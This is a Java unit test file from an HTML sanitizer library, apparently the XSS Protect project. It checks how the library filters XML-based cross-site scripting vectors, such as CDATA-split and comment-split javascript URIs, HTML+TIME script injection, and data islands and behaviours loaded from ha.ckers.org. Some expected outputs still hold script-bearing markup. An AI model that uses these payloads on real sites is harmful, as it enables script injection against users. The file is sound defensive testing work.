/**
 * Copyright 2007 Gerard Toonstra
 * 
 * Licensed under the terms of the Apache Software License v2
 *
 * This file is part of the XSS Protect library
 */

package com.blogspot.radialmind.xss.html;

import com.blogspot.radialmind.BaseTestCase;

// Verified vulnerability in :
// 		Firefox 2.0		not vulnerable
//
// Needs checking in IE6.0 

public class XMLElementTest extends BaseTestCase {
	String htmlNameSpace = "<html xmlns:xss><?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\"><xss:xss>XSS</xss:xss></html>";
	String xmlDataWithCData = "<html><body><xml id=\"I\"><x><c><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]></c></x></xml><span datasrc=\"#I\" datafld=\"C\" dataformatas=\"HTML\"></body></html>";
	String xmlDataIslandWIthComment = "<html><body><xml id=\"xss\"><i><b><img src=\"javas<!-- -->cript:alert('XSS')\"></b></i></xml><span datasrc=\"#xss\" datafld=\"B\" dataformatas=\"HTML\"></span></body></html>";
	String xmlLocallyHosted = "<html><body><xml src=\"http://ha.ckers.org/xsstest.xml\" id=\"I\"></xml><span datasrc=\"#I\" datafld=\"C\" dataformatas=\"HTML\"></span></body></html>";	
	String xmlHtmlTime = "<html><body><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>\"> </body></html>";

	public void testHtmlNameSpace() {
		testExecute(htmlNameSpace, "<html xmlns:xss><xss:xss></xss:xss></html>" );
	}

	public void testXmlDataWithCData() {
		testExecute(xmlDataWithCData, "<html><body><x><c></c></x><span datasrc=\"#I\" datafld=\"C\" dataformatas=\"HTML\"></span></body></html>" );
	}

	public void testDataIslandWithComment() {
		testExecute(xmlDataIslandWIthComment, "<html><body><i><b><img src=\"javas<!-- -->cript:alert('XSS')\"/></b></i><span datasrc=\"#xss\" datafld=\"B\" dataformatas=\"HTML\"></span></body></html>" );
	}

	public void testLocallyHosted() {
		testExecute(xmlLocallyHosted, "<html><body><span datasrc=\"#I\" datafld=\"C\" dataformatas=\"HTML\"></span></body></html>" );
	}

	public void testXmlHTMLTime() {
		testExecute(xmlHtmlTime, "<html><body><xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><t:set attributename=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>\"></t:set></xml:namespace></body></html>" );
	}
}
